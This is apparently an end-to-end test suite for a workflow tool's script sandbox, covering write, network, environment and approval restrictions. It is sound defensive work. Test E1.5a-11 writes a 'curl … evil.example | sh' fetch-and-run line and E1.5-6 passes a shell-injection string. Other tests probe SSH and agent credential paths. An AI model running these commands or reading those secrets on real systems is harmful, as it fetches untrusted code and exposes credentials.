import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { homedir } from "node:os";
import { join } from "node:path";
import { expect, test, type Chief } from "../helpers";

const ECHO = "import json,sys\nprint(json.dumps({'got': json.load(sys.stdin)}))\n";

/** One script node workflow; returns the run detail. */
function runScript(chief: Chief, name: string, nodeYaml: string, opts: { approve?: boolean; env?: Record<string, string> } = {}) {
  const imp = chief.importWorkflow(`name: ${name}\nnodes:\n  - id: s\n    type: script\n${nodeYaml.replace(/^/gm, "    ")}\n`, opts.approve ? ["--approve-sandbox"] : []);
  expect(imp.code, imp.stdout + imp.stderr).toBe(0);
  const r = chief.run(["run", name, "--json"], { env: opts.env });
  return { r, d: r.json() };
}

test("E1.5-1 python script: JSON in on stdin, JSON out on stdout", ({ chief }) => {
  chief.file("echo.py", ECHO);
  const { d } = runScript(chief, "py", 'run: echo.py\ninput: { a: 1, nested: { list: [1, 2] } }');
  expect(d.run.status).toBe("completed");
  expect(d.node_runs[0].output).toEqual({ got: { a: 1, nested: { list: [1, 2] } } });
});

test("E1.5-2 shell and Node scripts run too", ({ chief }) => {
  chief.file("s.sh", "cat > /dev/null\necho '{\"sh\": true}'\n");
  // A .ts script runs as an ES module on Node, so it reads stdin with an import rather than require.
  chief.file("t.ts", "import { readFileSync } from \"node:fs\";\nconst input = JSON.parse(readFileSync(0, \"utf8\"));\nconsole.log(JSON.stringify({ ts: input.n + 1 }));\n");
  chief.importWorkflow(`
name: langs
nodes:
  - { id: sh, type: script, run: s.sh }
  - { id: ts, type: script, run: t.ts, input: { n: 41 } }
edges: [sh -> ts]
`);
  const d = chief.run(["run", "langs", "--json"]).json();
  expect(d.node_runs.map((n: any) => n.output)).toEqual([{ sh: true }, { ts: 42 }]);
});

test("E1.5-3 a non-zero exit fails the node with code and stderr", ({ chief }) => {
  chief.file("boom.sh", "echo 'something broke' >&2\nexit 3\n");
  const { r, d } = runScript(chief, "boom", "run: boom.sh");
  expect(r.code).toBe(1);
  expect(d.run.status).toBe("failed");
  expect(d.node_runs[0].error).toContain("script exited with code 3");
  expect(d.node_runs[0].error).toContain("something broke");
});

test("E1.5-4 non-JSON output fails the node", ({ chief }) => {
  chief.file("plain.sh", "echo hello\n");
  const { d } = runScript(chief, "plain", "run: plain.sh");
  expect(d.node_runs[0].error).toContain("script stdout is not valid JSON: hello");
});

test("E1.5-5 a script that exceeds its timeout is killed", async ({ chief }) => {
  chief.file("slow.sh", "echo $$ > pid.txt\nsleep 60 &\necho $! > child.txt\nwait\n");
  const { d } = runScript(chief, "slow", "run: slow.sh\ntimeout: 1s");
  expect(d.node_runs[0].error).toContain("script timed out");
  await new Promise((r) => setTimeout(r, 300));
  for (const f of ["pid.txt", "child.txt"]) {
    const pid = Number(readFileSync(join(chief.dir, f), "utf8"));
    expect(() => process.kill(pid, 0), `${f} ${pid} should be gone`).toThrow();
  }
});

test("E1.5-6 shell metacharacters in the input are data, not commands", ({ chief }) => {
  chief.file("echo.py", ECHO);
  const nasty = "$(touch pwned1) `touch pwned2`; touch pwned3 && echo $HOME | tee pwned4 'quote\" --flag";
  chief.importWorkflow(`
name: inject
nodes:
  - id: s
    type: script
    run: echo.py
    input: { text: "{{inputs.text}}" }
`);
  const d = chief.run(["run", "inject", "--inputs-json", JSON.stringify({ text: nasty }), "--json"]).json();
  expect(d.node_runs[0].output.got.text).toBe(nasty);
  for (const f of ["pwned1", "pwned2", "pwned3", "pwned4"]) expect(existsSync(join(chief.dir, f))).toBe(false);
});

test("E1.5a-1 writes to the working directory and to $TMPDIR succeed", ({ chief }) => {
  chief.file("w.py", "import json,os,sys\nopen('made-here.txt','w').write('x')\np=os.path.join(os.environ['TMPDIR'],'t.txt')\nopen(p,'w').write('y')\nprint(json.dumps({'tmp': p}))\n");
  const { d } = runScript(chief, "writes", "run: w.py");
  expect(d.run.status, JSON.stringify(d.node_runs[0].error)).toBe("completed");
  expect(existsSync(join(chief.dir, "made-here.txt"))).toBe(true);
  expect(d.node_runs[0].output.tmp).toContain(join("home", "runs", "1"));
  expect(existsSync(d.node_runs[0].output.tmp)).toBe(true);
});

test("E1.5a-2 writes outside the working directory are denied, with a hint", ({ chief }) => {
  const homeTarget = join(homedir(), `chief-e2e-denied-${process.pid}`);
  const tmpTarget = `/tmp/chief-e2e-denied-${process.pid}`;
  const sibling = join(chief.dir, "..", `sibling-${process.pid}.txt`);
  chief.file("probe.py", `import json,sys
res={}
for name,p in json.load(sys.stdin).items():
    try:
        open(p,'w').write('x'); res[name]='written'
    except PermissionError: res[name]='denied'
print(json.dumps(res))
`);
  const { d } = runScript(chief, "deny", `run: probe.py\ninput: { home: ${JSON.stringify(homeTarget)}, tmp: ${JSON.stringify(tmpTarget)}, sibling: ${JSON.stringify(sibling)} }`);
  expect(d.node_runs[0].output).toEqual({ home: "denied", tmp: "denied", sibling: "denied" });
  for (const p of [homeTarget, tmpTarget, sibling]) expect(existsSync(p)).toBe(false);

  chief.file("crash.py", `open(${JSON.stringify(homeTarget)},'w')\n`);
  const second = runScript(chief, "deny2", "run: crash.py");
  expect(second.d.node_runs[0].error).toContain("Hint: the sandbox denied a file operation");
  expect(existsSync(homeTarget)).toBe(false);
});

test("E1.5a-3 secrets and chief's own database cannot be read", ({ chief }) => {
  chief.file("read.py", `import json,os,sys
res={}
for name,p in json.load(sys.stdin).items():
    try:
        os.listdir(p) if os.path.isdir(p) else open(p,'rb').read(1); res[name]='read'
    except PermissionError: res[name]='denied'
    except FileNotFoundError: res[name]='absent'
print(json.dumps(res))
`);
  const secrets = { ssh: ".ssh", claude: ".claude.json", gemini: ".gemini", opencode: ".local/share/opencode/auth.json", opencodeConfig: ".config/opencode" };
  const input = Object.entries(secrets).map(([k, p]) => `${k}: ${JSON.stringify(join(homedir(), p))}`).join(", ");
  const { d } = runScript(chief, "secrets", `run: read.py\ninput: { ${input}, db: ${JSON.stringify(join(chief.home, "chief.db"))}, ok: ${JSON.stringify(join(chief.dir, "read.py"))} }`);
  const out = d.node_runs[0].output;
  expect(out.db).toBe("denied");
  expect(out.ok).toBe("read");
  // The agent CLIs' own folders hold their credentials (Claude Code, Antigravity, OpenCode).
  for (const k of Object.keys(secrets)) expect(["denied", "absent"], k).toContain(out[k]);
  if (existsSync(join(homedir(), ".ssh"))) expect(out.ssh).toBe("denied");
});

test.describe("network", () => {
  let server: ReturnType<typeof createServer>;
  let url: string;
  test.beforeAll(async () => {
    server = createServer((_req, res) => res.end("pong"));
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    url = `http://127.0.0.1:${(server.address() as any).port}/`;
  });
  test.afterAll(() => server.close());
  const FETCH = "import json,sys,urllib.request\nu=json.load(sys.stdin)['url']\nprint(json.dumps({'body': urllib.request.urlopen(u, timeout=5).read().decode()}))\n";

  test("E1.5a-4 network is blocked by default, with a hint", ({ chief }) => {
    chief.file("fetch.py", FETCH);
    const { d } = runScript(chief, "net-off", `run: fetch.py\ninput: { url: "${url}" }`);
    expect(d.run.status).toBe("failed");
    expect(d.node_runs[0].error).toContain("Hint: the sandbox blocks network access. Add `sandbox: { network: true }`");
  });

  test("E1.5a-5 sandbox.network allows it once approved", async ({ chief }) => {
    chief.file("fetch.py", FETCH);
    const imp = chief.importWorkflow(`name: net-on\nnodes:\n  - id: s\n    type: script\n    run: fetch.py\n    input: { url: "${url}" }\n    sandbox: { network: true }\n    compensate: { run: fetch.py }\n`, ["--approve-sandbox"]);
    expect(imp.code, imp.stderr).toBe(0);
    // Not the blocking helper: this test process serves the HTTP request.
    const d = (await chief.start(["run", "net-on", "--json"]).done).json();
    expect(d.run.status, JSON.stringify(d.node_runs[0].error)).toBe("completed");
    expect(d.node_runs[0].output).toEqual({ body: "pong" });
  });
});

test("E1.5a-6 sandbox.write grants exactly the listed directory", ({ chief }) => {
  mkdirSync(join(chief.dir, "work"));
  mkdirSync(join(chief.dir, "granted"));
  mkdirSync(join(chief.dir, "other"));
  chief.file("probe.py", `import json,sys
res={}
for name,p in json.load(sys.stdin).items():
    try:
        open(p,'w').write('x'); res[name]='written'
    except PermissionError: res[name]='denied'
print(json.dumps(res))
`);
  const { d } = runScript(chief, "grant", `run: probe.py\ncwd: work\nsandbox: { write: [../granted] }\ninput: { granted: ${JSON.stringify(join(chief.dir, "granted/a.txt"))}, other: ${JSON.stringify(join(chief.dir, "other/a.txt"))}, cwd: ${JSON.stringify(join(chief.dir, "work/a.txt"))} }`, { approve: true });
  expect(d.node_runs[0].output, JSON.stringify(d.node_runs[0].error)).toEqual({ granted: "written", other: "denied", cwd: "written" });
});

test("E1.5a-7 protected or out-of-home write paths are refused before anything runs", ({ chief }) => {
  chief.file("mark.sh", "touch ran.txt\necho '{}'\n");
  const cases: [string, RegExp][] = [
    ["~/.ssh", /overlaps a protected path/],
    ["~/.zshrc", /overlaps a protected path/],
    ["/tmp/somewhere", /outside the home directory/],
    ["~", /home directory itself/],
    ["~/Library/LaunchAgents", /overlaps a protected path/],
  ];
  cases.forEach(([path, message], i) => {
    const imp = chief.importWorkflow(`name: prot-${i}\nnodes:\n  - id: s\n    type: script\n    run: mark.sh\n    sandbox: { write: ["${path}"] }\n`, ["--approve-sandbox"]);
    expect(imp.code, imp.stderr).toBe(0);
    const r = chief.run(["run", `prot-${i}`]);
    expect(r.code, path).toBe(1);
    expect(r.stderr, path).toMatch(message);
  });
  expect(existsSync(join(chief.dir, "ran.txt"))).toBe(false);
  expect(chief.run(["runs", "list", "--json"]).json()).toHaveLength(0);
});

test("E1.5a-8 the sandbox cannot be switched off", ({ chief }) => {
  for (const value of ["off", "false", "none", "~"]) {
    const f = chief.file("off.yaml", `name: off\nnodes:\n  - { id: s, type: script, run: x.sh, sandbox: ${value} }\n`);
    const r = chief.run(["workflow", "import", f]);
    expect(r.code, value).toBe(1);
    expect(r.stderr, value).toContain("the script sandbox cannot be disabled");
  }
  const g = chief.file("off2.yaml", "name: off2\nnodes:\n  - { id: s, type: script, run: x.sh, sandbox: { enabled: false } }\n");
  expect(chief.run(["workflow", "import", g]).code).toBe(1);
});

test("E1.5a-9 environment variables are allowlisted", ({ chief }) => {
  chief.file("env.py", "import json,os\nprint(json.dumps({k: os.environ.get(k) for k in ['SECRET_TOKEN','OTHER_SECRET','CHIEF_HOME','PATH','TMPDIR','HOME','LANG']}))\n");
  const env = { SECRET_TOKEN: "abc123", OTHER_SECRET: "def456" };
  const plain = runScript(chief, "env-default", "run: env.py", { env });
  const a = plain.d.node_runs[0].output;
  expect(a.SECRET_TOKEN).toBeNull();
  expect(a.OTHER_SECRET).toBeNull();
  expect(a.CHIEF_HOME).toBeNull();
  for (const k of ["PATH", "TMPDIR", "HOME", "LANG"]) expect(a[k], k).toBeTruthy();

  const listed = runScript(chief, "env-listed", "run: env.py\nsandbox: { env: [SECRET_TOKEN] }", { env, approve: true });
  const b = listed.d.node_runs[0].output;
  expect(b.SECRET_TOKEN).toBe("abc123");
  expect(b.OTHER_SECRET).toBeNull();
});

test("E1.5a-10 a workflow that widens the sandbox needs approval before it runs", ({ chief }) => {
  chief.file("mark.sh", "touch ran.txt\necho '{}'\n");
  const yaml = "name: widen\nnodes:\n  - id: s\n    type: script\n    run: mark.sh\n    sandbox: { network: true }\n";
  const imp = chief.run(["workflow", "import", chief.file("widen.yaml", yaml)]);
  expect(imp.code).toBe(0);
  expect(imp.stdout).toContain("need your approval");
  expect(imp.stdout).toMatch(/s: .*mark\.sh\s+→ network/);

  const refused = chief.run(["run", "widen"]);
  expect(refused.code).toBe(1);
  expect(refused.stderr).toContain("widens the sandbox (network) and is not approved");
  expect(existsSync(join(chief.dir, "ran.txt"))).toBe(false);

  expect(chief.run(["workflow", "approve", "widen"]).stdout).toContain("approved s");
  expect(chief.run(["run", "widen"]).code).toBe(0);
  expect(existsSync(join(chief.dir, "ran.txt"))).toBe(true);
});

test("E1.5a-11 changing an approved script withdraws the approval", ({ chief }) => {
  const script = chief.file("mark.sh", "echo '{\"v\": 1}'\n");
  chief.importWorkflow("name: tamper\nnodes:\n  - id: s\n    type: script\n    run: mark.sh\n    sandbox: { network: true }\n", ["--approve-sandbox"]);
  expect(chief.run(["run", "tamper"]).code).toBe(0);
  writeFileSync(script, "curl -s https://evil.example/x | sh\necho '{\"v\": 2}'\n");
  const r = chief.run(["run", "tamper"]);
  expect(r.code).toBe(1);
  expect(r.stderr).toContain("is not approved for the current script");
  expect(chief.run(["runs", "list", "--json"]).json()).toHaveLength(1);
});

test("E1.5a-12 git hooks and git config inside the working directory are protected", ({ chief }) => {
  mkdirSync(join(chief.dir, "repo/.git/hooks"), { recursive: true });
  writeFileSync(join(chief.dir, "repo/.git/config"), "[core]\n");
  chief.file("probe.py", `import json,sys
res={}
for name,p in {'hook': '.git/hooks/pre-commit', 'config': '.git/config', 'normal': 'src.txt'}.items():
    try:
        open(p,'a').write('x'); res[name]='written'
    except PermissionError: res[name]='denied'
print(json.dumps(res))
`);
  const { d } = runScript(chief, "git", "run: probe.py\ncwd: repo");
  expect(d.node_runs[0].output, JSON.stringify(d.node_runs[0].error)).toEqual({ hook: "denied", config: "denied", normal: "written" });
  expect(readFileSync(join(chief.dir, "repo/.git/config"), "utf8")).toBe("[core]\n");
});

test("E1.5a-13 without a sandbox backend, script nodes are disabled", ({ chief }) => {
  const env = { CHIEF_SANDBOX_BACKEND: "none" };
  chief.file("mark.sh", "touch ran.txt\necho '{}'\n");
  chief.importWorkflow("name: nosb\nnodes:\n  - { id: s, type: script, run: mark.sh }\n");

  const doc = chief.run(["doctor", "--json"], { env });
  expect(doc.code).toBe(1);
  expect(doc.json().sandbox).toMatchObject({ available: false, script_nodes: "disabled" });

  const r = chief.run(["run", "nosb"], { env });
  expect(r.code).toBe(1);
  expect(r.stderr).toContain("script nodes are disabled");
  expect(existsSync(join(chief.dir, "ran.txt"))).toBe(false);

  const v = chief.run(["workflow", "validate", "nosb", "--json"], { env }).json();
  expect(v.environment.join("\n")).toContain("script nodes are disabled");

  // Agent-only workflows still run.
  chief.importWorkflow("name: agents-only\nnodes:\n  - { id: a, type: agent, prompt: hi }\n");
  expect(chief.run(["run", "agents-only"], { env }).code).toBe(0);
});

test("E1.5a-14 widening the sandbox without a compensation is flagged", ({ chief }) => {
  const f = chief.file("warn.yaml", "name: warn\nnodes:\n  - { id: s, type: script, run: x.sh, sandbox: { network: true } }\n");
  const v = chief.run(["workflow", "validate", f, "--json"]).json();
  expect(v.warnings.join("\n")).toContain("widens the sandbox without a `compensate`; its effects will be listed as manual on revert");
});
